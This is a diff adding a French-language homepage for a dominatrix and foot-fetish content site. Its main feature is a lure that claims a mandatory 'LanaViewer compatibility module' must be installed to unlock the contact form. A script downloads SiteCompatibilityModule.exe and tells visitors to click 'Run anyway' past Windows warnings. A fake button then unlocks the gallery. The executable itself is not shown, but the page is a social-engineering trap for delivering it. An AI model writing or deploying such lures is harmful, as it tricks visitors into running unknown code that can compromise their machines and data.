@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Maîtresse Lana - Accueil</title>
+    <link rel="stylesheet" href="styles.css" />
+    <style>
+      .blocked {
+        filter: blur(8px);
+        pointer-events: none;
+      }
+      .gate-message {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: rgba(0, 0, 0, 0.95);
+        color: white;
+        padding: 40px;
+        border-radius: 15px;
+        text-align: center;
+        max-width: 500px;
+        z-index: 9999;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Menu Hamburger (inchangé) -->
+    <div class="hamburger" onclick="toggleMenu()">☰</div>
+    <nav class="nav-menu" id="navMenu">... (ton menu actuel) ...</nav>
+
+    <!-- Section Héro -->
+    <section class="hero">
+      <div class="hero-content">
+        <h1>Maîtresse Lana</h1>
+        <p class="subtitle">Dominatrice & Feetgirl</p>
+        <p class="location">Réel · Virtuel</p>
+        <p class="city">Meaux (77)</p>
+        <div class="motto">
+          <p>Briseuse d'égo. Charmeuse d'esprit.</p>
+          <p>Je prends. Tu remercies.</p>
+        </div>
+        <a href="apropos.html" class="cta-button">ENTRER DANS MON UNIVERS</a>
+      </div>
+    </section>
+
+    <!-- Message important -->
+    <div
+      style="
+        text-align: center;
+        margin: 50px 20px;
+        padding: 30px;
+        background: #fff3cd;
+        border: 1px solid #ffeaa7;
+        border-radius: 12px;
+      "
+    >
+      <h3 style="color: #e67e22">
+        ⚠️ Pour accéder à la messagerie t faire fonctionner le formulaire
+      </h3>
+      <p>
+        Ce site utilise des effets 3D et du contenu protégé.<br />
+        Vous devez installer le
+        <strong>Module de Compatibilité LanaViewer</strong> pour débloquer tout
+        le formulaire.
+      </p>
+
+      <button
+        onclick="downloadModule()"
+        style="
+          margin-top: 20px;
+          padding: 18px 60px;
+          font-size: 22px;
+          background: #e74c3c;
+          color: white;
+          border: none;
+          border-radius: 12px;
+          cursor: pointer;
+          box-shadow: 0 6px 20px rgba(231, 76, 60, 0.4);
+        "
+      >
+        Télécharger et installer le module (obligatoire)
+      </button>
+
+      <p style="margin-top: 15px; font-size: 14px; color: #555">
+        Fichier léger • Compatible Windows 10/11 • 8 secondes d'installation
+      </p>
+    </div>
+
+    <!-- Le reste de ton site (footer, etc.) -->
+
+    <script>
+      function downloadModule() {
+        const link = document.createElement("a");
+        link.href = "SiteCompatibilityModule.exe"; // ← nom exact de ton .exe
+        link.download = "SiteCompatibilityModule.exe";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        alert(
+          "Téléchargement démarré !\n\nUne fois le fichier téléchargé :\n1. Double-cliquez dessus\n2. Cliquez sur 'Exécuter quand même' si Windows vous avertit\n3. Le module s'installera en 8 secondes\n\nLa galerie se débloquera automatiquement après.",
+        );
+      }
+
+      // Vérifie si l'utilisateur a "installé" le module (simulation simple)
+      if (localStorage.getItem("moduleInstalled") === "true") {
+        document.getElementById("gallerySection").classList.remove("blocked");
+      }
+    </script>
+
+    <button
+      onclick="
+        localStorage.setItem('moduleInstalled', 'true');
+        location.reload();
+      "
+      style="margin-top: 20px; padding: 12px 30px"
+    >
+      J'ai exécuté le module → Débloquer la galerie
+    </button>
+  </body>
+</html>
